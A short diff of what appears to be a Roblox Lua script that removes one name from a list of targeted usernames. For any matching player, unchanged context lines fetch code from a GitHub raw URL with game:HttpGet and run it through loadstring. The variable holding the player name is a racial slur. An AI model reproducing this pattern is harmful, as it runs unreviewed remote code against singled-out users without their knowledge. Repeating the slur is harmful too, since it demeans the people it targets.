@@ -43,7 +43,6 @@ if nigga == "derrick0119" or
    nigga == "HeadTapCentraI" or
    nigga == "Raxitkaku" or
    nigga == "chad2746" or
-   nigga == "Jevaderishoe" or
    nigga == "homixidexchoppa" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/hellmid122/script-0x391/main/bl"))()
 end
